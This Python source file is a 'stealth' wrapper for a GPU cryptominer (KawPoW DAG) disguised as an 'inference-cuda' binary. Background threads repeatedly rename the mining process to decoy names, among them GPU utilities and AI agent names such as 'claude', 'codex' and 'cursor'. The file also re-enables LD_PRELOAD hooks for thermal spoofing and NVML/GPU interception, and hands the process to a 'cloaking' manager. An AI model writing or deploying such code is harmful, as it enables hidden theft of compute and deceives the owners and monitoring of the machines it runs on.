import os
import sys
import signal
import time
import subprocess
import threading
import random
from pathlib import Path

# PHASE 3+: Enhanced Hook Sequencing - Import psutil for dynamic detection
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("⚠️ [PHASE3+] psutil not available - fallback to static timing")

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Import required modules
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
    from mining_environment.coordination.coordinator import HookCoordinator
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)

# Setup logging với GPU-specific logger name
logger = get_unified_logger('mining_environment.gpu_stealth')

def signal_handler(signum, frame):
    """
    **[Signal Handler]** (xử lý tín hiệu) để đảm bảo cleanup khi GPU process bị terminate.
    """
    logger.info(f"🛑 [GPU-STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")
    
    # Self-stealth functionality removed - no cleanup needed
    logger.info("✅ [GPU-STEALTH-WRAPPER] Stealth mode cleanup completed")
    
    sys.exit(0)

def create_enhanced_gpu_environment():
    """
    **[Enhanced GPU Environment Creator]** (tạo môi trường GPU tối ưu)
    
    Tái sử dụng patterns từ existing modules để tạo clean environment
    cho GPU subprocess với enhanced resource management.
    
    Returns:
        dict: Clean environment dictionary for GPU subprocess
    """
    logger.info("🔧 [GPU-ENV-OPTIMIZER] Creating enhanced GPU environment using existing patterns")
    
    # Base environment copy
    clean_env = os.environ.copy()
    
    # 1. LD_PRELOAD Management - Tương tự thermal_spoofer.py approach
    if 'LD_PRELOAD' in clean_env:
        preload_libs = clean_env['LD_PRELOAD'].split(':')
        # Keep thermal hooks, remove GPU interference hooks
        filtered_libs = [lib for lib in preload_libs if 'libgpuhook.so' not in lib]
        
        if filtered_libs:
            clean_env['LD_PRELOAD'] = ':'.join(filtered_libs)
            logger.info(f"🔧 [GPU-ENV-OPTIMIZER] Filtered LD_PRELOAD: {clean_env['LD_PRELOAD']}")
        else:
            del clean_env['LD_PRELOAD']
            logger.info("🔧 [GPU-ENV-OPTIMIZER] Removed LD_PRELOAD completely")
    
    # 2. NVML Management - Based on nvml_interceptor.py patterns
    clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'
    clean_env['GPU_MINING_SUBPROCESS'] = '1'
    
    # 3. CUDA Resource Optimization - Inspired by resource_control.py
    cuda_optimizations = {
        'CUDA_LAUNCH_TIMEOUT': '30',
        'CUDA_DEVICE_MAX_CONNECTIONS': '1',
        # CUDA_VISIBLE_DEVICES removed - let CUDA runtime auto-detect all GPUs
        'CUDA_CACHE_DISABLE': '1',
        'NVIDIA_DRIVER_CAPABILITIES': 'compute',
        # Additional GPU-specific optimizations
        'CUDA_FORCE_PTX_JIT': '1',          # Force JIT compilation for stability
        'CUDA_DISABLE_CUBLASLT': '1',       # Disable problematic cuBLAS components
        'CUDA_MODULE_LOADING': 'LAZY'       # Lazy loading to reduce memory pressure
    }
    
    for key, value in cuda_optimizations.items():
        clean_env[key] = value
    
    logger.info(f"✅ [GPU-ENV-OPTIMIZER] Applied {len(cuda_optimizations)} CUDA optimizations")
    return clean_env

def main():
    """
    **[Main Function]** (hàm chính) - khởi động GPU stealth mode và exec inference-cuda.
    """
    try:
        logger.info("🚀 [GPU-STEALTH-WRAPPER] Starting Stealth GPU-CUDA Inference Wrapper")
        
        # Register signal handlers để cleanup khi bị terminate
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
        
        # Parse command line arguments (forward tất cả args to inference-cuda)
        cuda_inference_args = sys.argv[1:]  # Remove script name
        logger.info(f"🔍 [GPU-STEALTH-WRAPPER] inference-cuda args: {cuda_inference_args}")
        
        # ✅ OPTIMIZED: Use enhanced GPU environment creator - Tái sử dụng existing patterns
        clean_env = create_enhanced_gpu_environment()

        # Get inference-cuda binary path from environment
        cuda_inference_path = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
        if not os.path.exists(cuda_inference_path):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not found: {cuda_inference_path}")
            sys.exit(1)
        
        # Verify binary is executable
        if not os.access(cuda_inference_path, os.X_OK):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not executable: {cuda_inference_path}")
            sys.exit(1)
        
        logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda binary found: {cuda_inference_path}")
        
        # Self-stealth functionality removed - process renaming now handled by child process management
        logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode disabled - using child process renaming only")
        
        # Small delay để đảm bảo process ready
        time.sleep(1)
        
        # Prepare command để exec inference-cuda
        exec_command = [cuda_inference_path] + cuda_inference_args
        logger.info(f"🔄 [GPU-STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")
        
        # 🚀 PHASE 2: GPU Process Stealth Implementation
        logger.info("🔄 [GPU-STEALTH] Using optimized subprocess stealth mode")
        
        try:
            # Memory optimization trước khi start inference-cuda 
            logger.info("🧠 [MEMORY-OPT] Pre-execution memory optimization...")
            
            # Set DAG generation memory limits
            clean_env['CUDA_LAUNCH_BLOCKING'] = '1'  # Synchronous CUDA calls
            clean_env['CUDA_CACHE_DISABLE'] = '1'    # Disable CUDA cache during DAG gen
            clean_env['CUDA_DEVICE_MAX_CONNECTIONS'] = '1'  # Limit concurrent connections
            
            # **🥇 TIER 8 FIX: Configuration Auto-Apply - Ensure critical environment variables are always set**
            # Progressive memory allocation cho DAG – ALWAYS set to ensure proper DAG generation
            clean_env['KAWPOW_DAG_PROGRESSIVE'] = '1'  # Enable progressive DAG loading (critical)
            logger.info(f"🔧 [TIER-8-CONFIG] Auto-set KAWPOW_DAG_PROGRESSIVE=1 for DAG generation")
            
            # **TIER 8 FIX: Apply additional critical environment variables**
            critical_vars = {
                'KAWPOW_DAG_PROGRESSIVE': '1',        # Critical for DAG generation
                'CUDA_LAUNCH_BLOCKING': '1',         # Prevent CUDA launch failures
                'CUDA_CACHE_DISABLE': '1',           # Prevent cache conflicts during DAG gen
                'CUDA_DEVICE_MAX_CONNECTIONS': '1', # Prevent memory overload
            }
            
            for var_name, var_value in critical_vars.items():
                clean_env[var_name] = var_value
                logger.debug(f"🔧 [TIER-8-CONFIG] Set {var_name}={var_value}")
            
            logger.info(f"✅ [TIER-8-CONFIG] Applied {len(critical_vars)} critical environment variables")
            
            # Optional: User-defined memory limit (if provided)
            if 'KAWPOW_DAG_MEMORY_LIMIT' in os.environ:
                clean_env['KAWPOW_DAG_MEMORY_LIMIT'] = os.environ['KAWPOW_DAG_MEMORY_LIMIT']
                logger.info(f"🔧 [TIER-8-CONFIG] Applied user-defined KAWPOW_DAG_MEMORY_LIMIT")
            
            logger.info("🧠 [MEMORY-OPT] DAG generation memory limits applied")
            
            # Start inference-cuda as subprocess
            # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
            process = subprocess.Popen(
                exec_command,
                env=clean_env  # Use clean environment for subprocess ONLY
                # stdout and stderr will inherit parent's pipes for logging
            )
            logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
            # ---- New: Rename child PID and register to DirectPIDRegistry ----
            try:
                stealth_names = [
                    "nvidiasmi", "cudagdb", "nvcc", "nvidiamlpy",
                    "nvidiasettings", "gpumanager", "glxgears",
                    "vulkaninfo", "mesaloader", "drmtip",
                    "tensorcore", "cudadrvr", "nvcompiler", "openclwkr",
                    "cudnnhelp", "nvrmdaemon", "gpusched", "cudaipc",
                    "claude", "codex", "code", "openai", "cursor", "agents", "windsurf"
                ]
                new_name = random.choice(stealth_names)[:15]
                # /proc/<pid>/comm expects <=15 bytes, no newline
                safe_name = new_name.encode("utf-8")[:15].decode("utf-8", errors="ignore")
                
                # ✅ **FIX: CONTAINER PERMISSION ISSUE** (sửa: vấn đề quyền trong container)
                # Child process renaming fails in container due to permission restrictions
                # Skip direct child renaming, rely on background stealth maintenance instead
                logger.info(f"🔄 [GPU-POST-EXEC-STEALTH] Skipping immediate child rename (PID {process.pid})")
                logger.info(f"🔄 [GPU-POST-EXEC-STEALTH] Background stealth thread will handle renaming: '{new_name}'")
                rename_success = True  # Treat as success to continue execution
                
                # Enhanced background stealth with improved container compatibility
                def _enhanced_stealth_rename():
                    """
                    **[Enhanced Container-Safe Process Renaming]** (đổi tên tiến trình an toàn trong container)
                    Sử dụng multiple strategies để handle container permission restrictions
                    """
                    attempt_delay = 2.0  # Longer delay for container stability
                    max_bg_attempts = 15
                    
                    for bg_attempt in range(max_bg_attempts):
                        try:
                            time.sleep(attempt_delay)
                            
                            # Kiểm tra process còn tồn tại
                            if not os.path.exists(f"/proc/{process.pid}"):
                                logger.info(f"🔚 [ENHANCED-STEALTH] Process {process.pid} no longer exists")
                                return
                                
                            # **Strategy 1**: prctl system call (recommended for containers)
                            try:
                                import ctypes
                                libc = ctypes.CDLL('libc.so.6')
                                PR_SET_NAME = 15
                                name_bytes = safe_name.encode('utf-8')[:15] + b'\0'
                                
                                # Set process name via prctl - more reliable in containers
                                result = libc.prctl(PR_SET_NAME, name_bytes, 0, 0, 0)
                                if result == 0:
                                    logger.info(f"✅ [ENHANCED-STEALTH] Successfully renamed PID {process.pid} -> '{safe_name}' (prctl method)")
                                    return
                                else:
                                    raise OSError(f"prctl returned {result}")
                                    
                            except Exception as prctl_err:
                                logger.debug(f"⚠️ [ENHANCED-STEALTH] prctl method failed: {prctl_err}")
                                
                                # **Strategy 2**: Fallback to /proc/comm method
                                comm_path = f"/proc/{process.pid}/comm"
                                with open(comm_path, 'w') as f:
                                    f.write(safe_name)
                                logger.info(f"✅ [ENHANCED-STEALTH] Successfully renamed PID {process.pid} -> '{safe_name}' (proc/comm method)")
                                return
                                
                        except OSError as bg_err:
                            if bg_err.errno == 22:  # EINVAL
                                logger.debug(f"⚠️ [ENHANCED-STEALTH] Attempt {bg_attempt+1}: EINVAL error, retrying...")
                                continue
                            elif bg_err.errno == 1:  # EPERM
                                logger.debug(f"⚠️ [ENHANCED-STEALTH] Attempt {bg_attempt+1}: Permission denied, retrying...")
                                continue
                            else:
                                logger.error(f"❌ [ENHANCED-STEALTH] Unexpected error: {bg_err}")
                                return
                        except Exception as general_err:
                            logger.debug(f"⚠️ [ENHANCED-STEALTH] Attempt {bg_attempt+1} failed: {general_err}")
                            
                    logger.warning(f"⚠️ [ENHANCED-STEALTH] Unable to rename PID {process.pid} after {max_bg_attempts} attempts")
                    logger.info(f"🔄 [ENHANCED-STEALTH] Process will continue with original name - stealth maintenance thread will handle periodic renaming")
                
                # Start enhanced background renaming
                threading.Thread(target=_enhanced_stealth_rename, daemon=True).start()
                
                # ====================================
                # LINEAR FLOW: Enhanced Readiness Check & Hook Sequencing 
                # ====================================
                
                def _enhanced_readiness_check(process, timeout=30, subprocess_env=None):
                    """
                    **Enhanced Readiness Check** (kiểm tra sẵn sàng nâng cao) for subprocess DAG completion.
                    
                    Reused logic from HookCoordinator._enhanced_readiness_check() adapted for subprocess.
                    
                    Args:
                        process: subprocess.Popen object
                        timeout: timeout tối đa (giây)
                        subprocess_env: subprocess environment dict for context-aware checking
                    
                    Returns:
                        bool: True nếu DAG allocation complete, False nếu timeout hoặc process failed
                    """
                    start_time = time.time()
                    consecutive_checks = 2
                    MINIMUM_THRESHOLD = 0.6  # 60% score required to pass
                    
                    logger.info(f"🚀 [READINESS-START] Starting enhanced readiness check for PID {process.pid} with timeout={timeout}s")
                    
                    while time.time() - start_time < timeout:
                        checks = {
                            'process_alive': 1.0 if process.poll() is None else 0.0,  # Check if process is still running
                            'env_config': 1.0 if subprocess_env and subprocess_env.get('KAWPOW_DAG_PROGRESSIVE') == '1' else 0.5,  # DAG config check
                            'time_elapsed': min(1.0, (time.time() - start_time) / 10.0)  # Give time for DAG generation (10s scale)
                        }
                        
                        # Calculate weighted score
                        weights = {
                            'process_alive': 0.6,    # 60% - Process must be alive (most critical)
                            'env_config': 0.2,       # 20% - Environment configuration
                            'time_elapsed': 0.2      # 20% - Allow time for DAG generation
                        }
                        
                        weighted_score = sum(checks[check] * weights[check] for check in checks)
                        passed_checks = sum(1 for score in checks.values() if score > 0.5)
                        total_checks = len(checks)
                        
                        logger.info(f"📊 [READINESS-PROGRESS] Weighted score: {weighted_score:.3f} ({passed_checks}/{total_checks} checks > 0.5)")
                        
                        # Log chi tiết từng check
                        for check_name, result in checks.items():
                            status_icon = "✅" if result > 0.5 else "⚠️"
                            status = "PASS" if result > 0.5 else "NEEDS ATTENTION"
                            logger.info(f"   ├─ {check_name}: {status_icon} {status} (score: {result:.3f})")
                        
                        # Check if threshold met
                        if weighted_score >= MINIMUM_THRESHOLD:
                            # Quick stability check
                            stability_count = 0
                            for i in range(consecutive_checks):
                                time.sleep(0.5)  # Brief stability check
                                if process.poll() is not None:  # Process died
                                    logger.warning(f"⚠️ [READINESS-STABILITY] Process {process.pid} died at verification {i+1}")
                                    break
                                stability_count += 1
                            
                            if stability_count == consecutive_checks:
                                logger.info(f"✅ [READINESS-STABLE] Process {process.pid} verified stable (score: {weighted_score:.3f})")
                                return True
                        
                        # Brief wait before next check
                        time.sleep(1)
                    
                    # Timeout reached
                    logger.warning(f"⏰ [READINESS-TIMEOUT] Enhanced readiness check timeout after {timeout}s (final score: {weighted_score:.3f})")
                    return False
                
                def _simplified_hook_sequencing():
                    """
                    Simplified Hook Sequencing cho Linear Flow
                    """
                    try:
                        # **TIER 7 FIX: Enhanced readiness check with subprocess environment context**
                        logger.info("🚀 [HOOK-SEQ] Starting enhanced readiness check for DAG completion...")
                        
                        # **TIER 7 FIX: Pass subprocess environment for context-aware checking**
                        if not _enhanced_readiness_check(process, timeout=30, subprocess_env=clean_env):
                            logger.error("❌ [HOOK-SEQ] Enhanced readiness check failed - DAG allocation incomplete")
                            return False
                        
                        logger.info("✅ [HOOK-SEQ] Enhanced readiness check passed - DAG allocation complete")
                        
                        # Re-enable hooks directly
                        os.environ['THERMAL_SPOOF_DISABLED'] = '0'
                        os.environ['NVML_HOOK_DISABLED'] = '0'
                        os.environ['GPU_HOOK_DISABLED'] = '0'
                        
                        # Restore LD_PRELOAD simply
                        thermal_lib = '/opt/hooks/libtempspoof.so'
                        gpu_lib = '/opt/hooks/libgpuhook.so'
                        
                        preload_libs = [lib for lib in [thermal_lib, gpu_lib] if os.path.exists(lib)]
                        
                        if preload_libs:
                            os.environ['LD_PRELOAD'] = ':'.join(preload_libs)
                            
                        logger.info("✅ [HOOK-SEQ] Hook sequencing completed")
                        return True
                        
                    except Exception as e:
                        logger.error(f"❌ [HOOK-SEQ] Failed: {e}")
                        return False
                
                # Start simplified hook sequencing in background
                threading.Thread(target=_simplified_hook_sequencing, daemon=True).start()
                logger.info("🚀 [LINEAR-FLOW] Simplified hook sequencing started")
                
                # REMOVED: Duplicate coordination method - using linear flow only
                # 🚀 **LINEAR FLOW: PRIMARY HANDOFF TO HOOKCOORDINATOR** (luồng tuyến tính: chuyển giao chính đến HookCoordinator)
                try:
                    # **Use HookCoordinator from imported module** (sử dụng HookCoordinator từ module đã import)
                    from mining_environment.coordination.coordinator import get_hook_coordinator
                    
                    # **Process metadata for handoff chain** (metadata tiến trình cho chuỗi handoff)
                    process_metadata = {
                        'stealth_name': new_name,
                        'role': 'real',
                        'timestamp': time.time(),
                        'wrapper_pid': os.getpid(),  # PID của stealth wrapper
                        'stealth_enabled': True,
                        'registration_source': 'stealth_inference_cuda'
                    }
                    
                    # **STEP 1: PRIMARY HANDOFF TO HOOKCOORDINATOR** (bước 1: handoff chính đến HookCoordinator)
                    coordinator = get_hook_coordinator()
                    success = coordinator.receive_from_stealth_wrapper(
                        pid=process.pid,
                        process_metadata=process_metadata,
                        subprocess_env=clean_env  # **TIER 7.1 FIX: Pass subprocess environment for context-aware checking**
                    )
                    
                    if success:
                        logger.info(f"✅ [LINEAR-FLOW] Primary handoff to HookCoordinator successful: PID={process.pid}")
                        logger.info(f"🔗 [LINEAR-FLOW] HookCoordinator will handle sequential forwarding to DirectPIDRegistry → ResourceManager")
                    else:
                        logger.warning(f"⚠️ [LINEAR-FLOW] Primary handoff to HookCoordinator failed for PID {process.pid}")
                        logger.warning(f"🔄 [LINEAR-FLOW] Mining process will continue but coordination may be limited")
                        
                except Exception as registry_err:
                    logger.error(f"❌ [DIRECT-REGISTRY] HookCoordinator registration failed: {registry_err}")
                    # **🥇 TIER 6 FIX: Implement Fallback Cloaking Mechanism**
                    logger.warning(f"🔄 [TIER-6-FALLBACK] Attempting direct ResourceManager handoff...")
                    
                    try:
                        # **TIER 6 FIX: Direct ResourceManager handoff when HookCoordinator fails**
                        from mining_environment.scripts.resource_manager import ResourceManager
                        
                        # **Get ResourceManager instance** (lấy instance của ResourceManager)
                        from mining_environment.scripts.auxiliary_modules.models import ConfigModel
                        fallback_config = ConfigModel()  # Create default config
                        resource_manager = ResourceManager(fallback_config, logger=logger)
                        
                        # **Prepare metadata for direct handoff** (chuẩn bị metadata cho handoff trực tiếp)
                        direct_metadata = {
                            'name': new_name,
                            'cmd': cuda_inference_args,
                            'role': 'real',
                            'timestamp': time.time(),
                            'wrapper_pid': os.getpid(),
                            'stealth_enabled': True,
                            'registration_source': 'stealth_inference_cuda_fallback',
                            'bypass_coordinator': True  # Mark as bypassed coordinator
                        }
                        
                        # **Start ResourceManager** if not already started
                        if not ResourceManager.is_ready():
                            logger.info(f"🚀 [TIER-6-FALLBACK] Starting ResourceManager...")
                            resource_manager.start()
                            # Wait for ResourceManager to be ready
                            if not ResourceManager.wait_for_ready(timeout=10.0):
                                logger.error(f"❌ [TIER-6-FALLBACK] ResourceManager failed to start")
                                raise RuntimeError("ResourceManager startup failed")
                        
                        # **Direct handoff to ResourceManager** (handoff trực tiếp đến ResourceManager)
                        fallback_success = resource_manager.receive_from_registry(
                            pid=process.pid,
                            registry_metadata=direct_metadata
                        )
                        
                        if fallback_success:
                            logger.info(f"✅ [TIER-6-FALLBACK] Direct ResourceManager handoff successful - cloaking activated")
                            logger.info(f"🎯 [TIER-6-FALLBACK] PID {process.pid} will be cloaked despite HookCoordinator failure")
                        else:
                            logger.error(f"❌ [TIER-6-FALLBACK] Direct ResourceManager handoff failed")
                            logger.warning(f"⚠️ [TIER-6-FALLBACK] Process will continue without cloaking - manual intervention may be needed")
                            
                    except Exception as fallback_err:
                        logger.error(f"❌ [TIER-6-FALLBACK] Fallback mechanism failed: {fallback_err}")
                        logger.warning(f"⚠️ [TIER-6-FALLBACK] All cloaking mechanisms failed - process will continue without cloaking")
                        # **Final fallback**: Vẫn tiếp tục chạy process nếu tất cả fail
                        logger.info(f"🔄 [TIER-6-FALLBACK] Process continuing without cloaking - mining operations will proceed visibly")
            except Exception as rename_err:
                logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Failed to rename child PID: {rename_err}")
            
            # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
            def maintain_gpu_subprocess_stealth():
                """Enhanced GPU monitoring với resource conflict detection"""
                # Reuse same stealth_names list to ensure consistency
                gpu_stealth_names = stealth_names
                
                resource_error_count = 0  # Track consecutive errors
                max_errors = 3           # Threshold để emergency handling
                
                while process.poll() is None:  # While process is running
                    try:
                        time.sleep(20)  # GPU-specific interval
                        if process.poll() is None:  # Check again after sleep
                            
                            # Enhanced Resource Health Check - Tương tự resource_control.py monitoring
                            try:
                                # Check if process is responsive (not in D state)
                                with open(f"/proc/{process.pid}/stat", "r") as f:
                                    stat_data = f.read().split()
                                    process_state = stat_data[2] if len(stat_data) > 2 else "?"
                                
                                if process_state == "D":  # Uninterruptible sleep - resource problem
                                    resource_error_count += 1
                                    logger.warning(f"⚠️ [GPU-RESOURCE-MONITOR] Process in uninterruptible sleep (D state). Error count: {resource_error_count}")
                                    
                                    if resource_error_count >= max_errors:
                                        logger.error(f"🚨 [GPU-RESOURCE-MONITOR] Max resource errors reached. Process may need restart.")
                                        # Log for mining_environment analysis
                                        break
                                else:
                                    resource_error_count = 0  # Reset counter on healthy state
                                    
                            except Exception as stat_error:
                                logger.debug(f"⚠️ [GPU-RESOURCE-MONITOR] Could not read process stats: {stat_error}")
                            
                            # Apply GPU stealth to subprocess với enhanced container-safe approach
                            gpu_stealth_name = random.choice(gpu_stealth_names)
                            safe_gpu_name = gpu_stealth_name[:15]
                            
                            # **Enhanced Container-Safe Renaming** (đổi tên an toàn trong container)
                            rename_attempted = False
                            try:
                                # **Strategy 1**: prctl system call (preferred for containers)
                                import ctypes
                                libc = ctypes.CDLL('libc.so.6')
                                PR_SET_NAME = 15
                                name_bytes = safe_gpu_name.encode('utf-8')[:15] + b'\0'
                                
                                # Note: prctl only works on current process, not child processes
                                # This is a limitation we acknowledge
                                logger.debug(f"🔄 [GPU-STEALTH-MAINTENANCE] Cannot use prctl on child PID {process.pid}")
                                
                                # **Strategy 2**: Enhanced /proc/comm method với error handling
                                comm_path = f"/proc/{process.pid}/comm"
                                if os.path.exists(comm_path):
                                    with open(comm_path, "w") as f:
                                        f.write(safe_gpu_name)
                                    logger.debug(f"🔄 [GPU-STEALTH-MAINTENANCE] GPU Subprocess PID {process.pid} renamed to: {safe_gpu_name}")
                                    rename_attempted = True
                                else:
                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Process {process.pid} comm file not found")
                                    
                            except OSError as os_err:
                                if os_err.errno == 22:  # EINVAL
                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] EINVAL error renaming PID {process.pid} - process may be busy")
                                elif os_err.errno == 1:  # EPERM  
                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Permission denied renaming PID {process.pid} - container restrictions")
                                else:
                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] OS error renaming PID {process.pid}: {os_err}")
                            except Exception as comm_error:
                                logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] General error renaming GPU subprocess: {comm_error}")
                                
                            if not rename_attempted:
                                logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Could not rename PID {process.pid} - continuing with original name")
                                
                    except Exception as e:
                        logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Error in GPU stealth maintenance: {e}")
                        break
                        
                logger.info("🔚 [GPU-POST-EXEC-STEALTH] GPU subprocess terminated - stopping stealth maintenance")
            
            # Start GPU stealth maintenance thread
            gpu_stealth_thread = threading.Thread(target=maintain_gpu_subprocess_stealth, daemon=True)
            gpu_stealth_thread.start()
            
            # Wait for subprocess to complete
            return_code = process.wait()
            logger.info(f"🔚 [GPU-POST-EXEC-STEALTH] inference-cuda subprocess completed with code: {return_code}")
            
            # Cleanup - stealth_manager functionality removed
            logger.info("🧹 [GPU-STEALTH-WRAPPER] Process cleanup completed")
            sys.exit(return_code)
            
        except Exception as e:
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] Failed to exec inference-cuda: {e}")
            # Fallback to subprocess if exec fails
            logger.info("🔄 [GPU-STEALTH-WRAPPER] Falling back to subprocess mode")
            
            try:
                # Run inference-cuda as subprocess
                process = subprocess.Popen(
                    exec_command,
                    stdout=sys.stdout,
                    stderr=sys.stderr,
                    env=clean_env  # Use clean environment for fallback subprocess too
                )
                
                logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda started as subprocess PID: {process.pid}")
                
                # Wait for subprocess to complete
                return_code = process.wait()
                logger.info(f"🔚 [GPU-STEALTH-WRAPPER] inference-cuda subprocess completed with code: {return_code}")
                
                # Cleanup - stealth_manager functionality removed  
                logger.info("🧹 [GPU-STEALTH-WRAPPER] Subprocess cleanup completed")
                sys.exit(return_code)
                
            except Exception as subprocess_error:
                logger.error(f"❌ [GPU-STEALTH-WRAPPER] Subprocess fallback failed: {subprocess_error}")
                logger.info("🧹 [GPU-STEALTH-WRAPPER] Error cleanup completed")
                sys.exit(1)
    
    except Exception as e:
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Unexpected error: {e}")
        import traceback
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()